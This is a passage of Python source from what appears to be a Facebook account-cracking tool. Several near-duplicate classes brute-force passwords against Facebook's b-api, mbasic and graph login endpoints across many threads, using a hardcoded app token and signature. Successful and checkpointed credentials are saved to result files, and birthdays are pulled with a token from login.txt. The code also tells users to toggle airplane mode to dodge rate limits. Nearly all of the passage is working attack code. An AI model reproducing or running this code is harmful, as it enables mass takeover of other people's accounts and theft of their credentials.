					ThreadPool(30).map(self.api_opsi,self.fl)
				except: pass
				break
			print ('\nDone..')
			exit()
	def pwlist(self):
		self.pw=input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
			print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
			try:
				ThreadPool(25).map(self.api_opsi,self.fl)
			except: pass
		print ('\nDone..')
		exit()
	def api_opsi(self,fl):
		try:
			for i in fl.get("pw"):
				log = log_api(fl.get("id"),
					i,"https://b-api.facebook.com")
				if log.get("status")=="cp":
					try:
						try:
							token = open("login.txt").read()
							toket = open("login.txt").read()
							jok = requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
							op = json.loads(jok.text)
							ttll = op['birthday']
						except (KeyError, IOError):
							ttll = (' ')
						print("\r%s[%sCP%s] %s|%s|%s                 "%(K,P,K,fl.get("id"),i,ttll))
						self.cp.append("%s|%s|%s"%(fl.get("id"),i,ttll))
						bokep_japan_yang_terbaru("CP", fl.get("id"), i, ttll)
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s\n"%(fl.get("id"),i,ttll))
						break
					except(KeyError, IOError):
						h_cp = "\r%s[%sCP%s] %s|%s               "%(K,P,K,fl.get("id"),i)
						cek_log(fl.get("id"),i,h_cp)
						print("")
						self.cp.append("%s|%s"%(fl.get("id"),i))
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
						break
				elif log.get("status")=="success":
					print("\r%s[%sOK%s] %s|%s                 "%(I,P,I,fl.get("id"),i))
					print("")
					self.ada.append("%s|%s"%(fl.get("id"),i))
					bokep_japan_yang_terbaru("OK", fl.get("id"), i, "-")
					open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
                    
			self.ko+=1
			print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp))), end=' ');sys.stdout.flush()
		except:
			self.api_opsi(fl)
class bapio_free:
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			pilih_pw()
			f=input(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p+" : "))
			if f=="":continue
			elif f=="y" or f=="Y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'Problem Not Found')
					continue
				print(bulat+'Password Example : sayang,anjing')
				self.pwlist()
				break
			elif f=="n" or f=="N":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
				print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
#				try:
				ThreadPool(30).map(self.api_free,self.fl)
#				except: pass
				break
			print ('\nDone..')
			exit()
	def pwlist(self):
		self.pw=input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
			print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
			try:
				ThreadPool(25).map(self.api_free,self.fl)
			except: pass
		print ('\nDone..')
		exit()
	def api_free(self,fl):
		try:
			for i in fl.get("pw"):
				log = log_api(fl.get("id"),
					i,"https://b-api.facebook.com")
				if log.get("status")=="cp":
					try:
						try:
							token = open("login.txt").read()
							toket = open("login.txt").read()
							jok = requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
							op = json.loads(jok.text)
							ttll = op['birthday']
						except (KeyError, IOError):
							ttll = (' ')
						print("\r%s[%sCP%s] %s|%s|%s                 "%(K,P,K,fl.get("id"),i,ttll))
						bokep_japan_yang_terbaru("CP", fl.get("id"), i, ttll)
						self.cp.append("%s|%s|%s"%(fl.get("id"),i,ttll))
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s\n"%(fl.get("id"),i,ttll))
						break
					except(KeyError, IOError):
						m = " "
						d = " "
						y = " "
						break
				elif log.get("status")=="success":
					print("\r%s[%sOK%s] %s|%s                   "%(I,P,I,fl.get("id"),i))
					print("")
					self.ada.append("%s|%s"%(fl.get("id"),i))
					bokep_japan_yang_terbaru("OK", fl.get("id"), i, "-")
					open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
                    
			self.ko+=1
			print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp))), end=' ');sys.stdout.flush()
		except:
			self.api_opsi(fl)
class crack_new_vvip:
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			pilih_pw()
			f=input(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p+" : "))
			if f=="":continue
			elif f=="y" or f=="Y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'Problem Not Found')
					continue
				print(bulat+'Password Example : sayang,anjing')
				self.pwlist()
				break
			elif f=="n" or f=="N":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
				print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
				try:
					ThreadPool(25).map(self.mbasic_opsi,self.fl)
				except: pass
				break
			print ('\nDone..')
			exit()
	def pwlist(self):
		self.pw=input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
			print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
			try:
				ThreadPool(30).map(self.mbasic_opsi,self.fl)
			except: pass
		print ('\nDone..')
		exit()
	def mbasic_opsi(self,fl):
		try:
			for i in fl.get("pw"):
				log = log_mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						try:
							token = open("login.txt").read()
							toket = open("login.txt").read()
							jok = requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
							op = json.loads(jok.text)
							ttll = op['birthday']
						except (KeyError, IOError):
							ttll = (' ')
						print("\r%s[%sCP%s] %s|%s|%s                 "%(K,P,K,fl.get("id"),i,ttll))
						bokep_japan_yang_terbaru("CP", fl.get("id"), i, ttll)
						self.cp.append("%s|%s|%s"%(fl.get("id"),i,ttll))
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s\n"%(fl.get("id"),i,ttll))
						break
					except(KeyError, IOError):
						m = " "
						d = " "
						y = " "
						h_cp = "\r%s[%sCP%s] %s|%s            "%(K,P,K,fl.get("id"),i)
						cek_log(fl.get("id"),i,h_cp)
						print("")
						self.cp.append("%s|%s"%(fl.get("id"),i))
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
						break
				elif log.get("status")=="success":
					h_ok = "\r%s[%sOK%s] %s|%s%s           "%(I,P,I,fl.get("id"),i,P)
					cek_apk(h_ok,koki(log.get("cookies")))
					print("")
					bokep_japan_yang_terbaru("OK", fl.get("id"), i, "-")
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue

			self.ko+=1
			print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp))), end=' ');sys.stdout.flush()
		except:
			self.mbasic_opsi(fl)
class crack_new_free:
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			pilih_pw()
			f=input(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p+" : "))
			if f=="":continue
			elif f=="y" or f=="Y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'Problem Not Found')
					continue
				print(bulat+'Password Example : sayang,anjing')
				self.pwlist()
				break
			elif f=="n" or f=="N":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
				print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
				try:
					ThreadPool(25).map(self.mbasic_free,self.fl)
				except: pass
				break
			print ('\nDone..')
			exit()
	def pwlist(self):
		self.pw=input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
			print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
			try:
				ThreadPool(30).map(self.mbasic_free,self.fl)
			except: pass
		print ('\nDone..')
		exit()
	def mbasic_free(self,fl):
		try:
			for i in fl.get("pw"):
				log = log_mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						try:
							token = open("login.txt").read()
							toket = open("login.txt").read()
							jok = requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
							op = json.loads(jok.text)
							ttll = op['birthday']
						except (KeyError, IOError):
							ttll = (' ')
						print("\r%s[%sCP%s] %s|%s|%s                 "%(K,P,K,fl.get("id"),i,ttll))
						bokep_japan_yang_terbaru("CP", fl.get("id"), i, ttll)
						self.cp.append("%s|%s|%s"%(fl.get("id"),i,ttll))
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s\n"%(fl.get("id"),i,ttll))
						break
					except(KeyError, IOError):
						print("\r%s[%sCP%s] %s|%s           "%(K,P,K,fl.get("id"),i))
						self.cp.append("%s|%s"%(fl.get("id"),i))
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
						break
				elif log.get("status")=="success":
					print("\r%s[%sOK%s] %s|%s%s     "%(I,P,I,fl.get("id"),i,P))
					bokep_japan_yang_terbaru("OK", fl.get("id"), i, "-")
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue

			self.ko+=1
			print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp))), end=' ');sys.stdout.flush()
		except:
			self.mbasic_opsi(fl)
class crackmenu:

    def __init__(self,isifile):
        self.id = []
    def passmenu(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        print('\n\n'+war+'Do you want to use manual password? '+K+'['+M+'y'+q+'/'+I+'n'+K+']')
        zk = input(inp+'Choose An Option : ')
        if zk in ('y','Y'):
            while True:
                pwx = input('\n'+inp+"Enter Manual Password : ")
                jalan("%sThe Password You Use : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Please Enter Password !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimum 6 Letters !!")
                else:
                    jalan("\n\n"+war+"Turn On Airplane Mode, For 5 Seconds, Then Turn It Off\n"+war+"Ok Crack Results Saved In : "+I+"Hasil/OK-"+durasi+".txt\n"+war+"Cp Crack Results Stored In : "+K+"Hasil/CP-"+durasi+".txt\n\n")
                    print(war+"Crack Start Hours : "+C+durasi+I+"  "+K+jamz+"\n\n")
                    def zkth(zsc=None):
                    	with zthreads(max_workers=30) as (form):
                    		for uid in self.id:
                    			try:
                    				userid = uid.split('<=>')[0]
                    				form.submit(self.api, userid, zsc)
                    			except: pass
                    	os.remove(self.apk)
                    zkth(pwx.split(','))
                    break
        elif zk in ('n', 'N'):
	        pilih_pw()
	        jalan("\n\n"+war+"Turn On Airplane Mode, For 5 Seconds, Then Turn It Off\n"+war+"Ok Crack Results Saved In : "+I+"Hasil/OK-"+durasi+".txt\n"+war+"Cp Crack Results Stored In : "+K+"Hasil/CP-"+durasi+".txt\n\n")
	        print(war+"Crack Start Hours : "+C+durasi+I+"  "+K+jamz+"\n\n")
	        self.passwords()

        else:
            print(war+'Wrong Input! Try Again')
            time.sleep(2)
            crackmenu().passmenu()
        return


    def api(self, user, zkth):
        global ok,cp,loop
        for pw in zkth:
            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            print('\r[%s%s%s] %s/%s OK:%s CP:%s '%(C,datetime.now().strftime('%H:%M:%S'),q,loop,len(self.id),len(ok),len(cp)), end=' ');sys.stdout.flush()
            try:
                 useragenth = open("ua_me.txt","r").read()
            except IOError:
                 useragenth = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": useragenth,"content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\r%s[%sOK%s]%s %s|%s|%s                 %s'%(H,I,H,I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                open('Hasil/OK-'+durasi+'.txt' , 'a+').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    loginz = open("login.txt").read()
                    token = open("login.txt").read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday']
                    print ('\r%s[%sCP%s]%s %s|%s|%s      %s'%(q,K,q,K,user,pw,dob,q))
                    bokep_japan_yang_terbaru("CP", user, pw, dob)
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    cp.append(wrt)
                    open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ' '
                except:
                    pass
                print('\r%s[%sCP%s]%s %s|%s                  '%(q,K,q,K,user,pw))
                bokep_japan_yang_terbaru("CP", user, pw, "-")
                wrt = ('%s|%s'%(user,pw))
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                break
                continue

        loop += 1


    def passwords(self):
            with zthreads(max_workers=25) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        xz = zz[1].split(' ')
#                        if len(xz)>=5:
 #                           pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]+' '+xz[4]]
  #                      elif len(xz) <= 1:
   #                         pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]]
    #                    elif len(xz) <= 2:
     #                       pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]]
      #                  elif len(xz) <= 3:
       #                     pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]]
        #                elif len(xz) <= 4:
         #                   pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]]
          #              else:
           #                 pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345']
                        form.submit(self.api,zz[0], generate(uname.split("<=>")[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Done...")
class grap:
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=input(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p+" : "))
			if f=="":continue
			elif f=="y" or f=="Y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(war+'Problem Not Found')
					continue
				print(bulat+'Password Example : sayang,anjing')
				self.pwlist()
				break
			elif f=="n" or f=="N":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(war+'Problem Not Found !!')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(war+'File Tidak Valid')
					menu()
					continue
				print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
				print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print (war+'Done ...')
				break
	def pwlist(self):
		self.pw=input(inp+"Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\n"+war+'Ok Crack Results Saved At : '+I+'Hasil/OK-'+durasi+'.txt')
			print(war+'Cp Crack Results Saved At : '+I+'Hasil/CP-'+durasi+'.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\nDone..')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=graph(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print(q+"\r["+I+"OK"+q+"]"+I+(fl.get("id")+"\033[0;97m|\033[0;92m"+i+"      "))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("Hasil/OK-"+durasi+".txt").read():
						break
					else:
						open("Hasil/OK-"+durasi+".txt","a+").write(
						"%s|%s\n\n"%(fl.get("id"),i))
					ko="%s|%s\n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print(q+"\r["+K+"CP"+q+"]"+K+(fl.get("id")+"\033[0;97m|\033[0;93m "+i+"      "))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp))), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    pilih_pw()
    print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Dumai-991 : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["y","Y"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["n","N"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + "|" + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s %s               "%(username,password,N)))
      ok.append(username + "|" + password)
      save = open("Hasil/OK-"+durasi+".txt", "a")
      save.write(str(username) + "|" + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + "|" + password + "|" + ttl)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s|%s\x1b[0m   "%(username,password,ttl)))
        save = open("CP-"+durasi+".txt", "a+")
        save.write(str(username) + "|" + str(password) + "|"+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    pilih_pw()
    print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Dumai-991 ?: ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["y","Y"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["n","N"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + "|" + password)
